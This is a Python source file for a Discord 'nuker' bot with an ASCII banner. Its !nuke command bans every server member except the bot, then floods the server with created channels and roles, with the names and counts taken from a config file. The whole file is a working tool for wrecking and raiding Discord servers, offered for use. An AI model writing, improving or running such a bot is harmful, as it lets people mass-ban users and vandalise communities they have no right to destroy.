import discord 
from discord.ext import commands
from colorama import * 
import os
import asyncio
import json 

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def banner():
    os.system("cls")
    print(Fore.BLUE + """ 
 ________  ________  ________  ___  ________  _______   ________     
|\   __  \|\   __  \|\   __  \|\  \|\   ___ \|\  ___ \ |\   __  \    
\ \  \|\  \ \  \|\  \ \  \|\  \ \  \ \  \_|\ \ \   __/|\ \  \|\  \   
 \ \   ____\ \   _  _\ \   __  \ \  \ \  \ \\ \ \  \_|/_\ \   _  _\  
  \ \  \___|\ \  \\  \\ \  \ \  \ \  \ \  \_\\ \ \  \_|\ \ \  \\  \| 
   \ \__\    \ \__\\ _\\ \__\ \__\ \__\ \_______\ \_______\ \__\\ _\ 
    \|__|     \|__|\|__|\|__|\|__|\|__|\|_______|\|_______|\|__|\|__|
                                                                     
                                                                     
                                                                     
""")





@bot.event 
async def on_ready():
    banner()
    print(f"bot connected to {bot.user}")

def t(val):
    with open("config.json", 'r') as f:
        config = json.load(f)
    return config[val]




@bot.command()
async def nuke(ctx):
    tasks=[]
    for member in ctx.guild.members:
        if member == bot.user:
            continue

    
        task = asyncio.create_task(ban(member))
        tasks.append(task)

    for _ in range(t("channel_amount")):
        task = asyncio.create_task(channel(ctx.guild))
        tasks.append(task)
    for _ in range(t("role_amount")):
        task = asyncio.create_task(roles(ctx.guild))
        


async def ban(member):
    try:
        await member.ban(reason=t("ban_reason"))
        print(f"success | {member.name}")
        await asyncio.sleep(0.7)
    except discord.Forbidden:
        print(f"missing permissions | {member.name}")
        
async def channel(guild):
        b = t("chan")
        await guild.create_text_channel(b)
        await asyncio.sleep(0.7)


async def roles(guild):
    await guild.create_role(name=t("role_name"))

bot.run(t("token"))
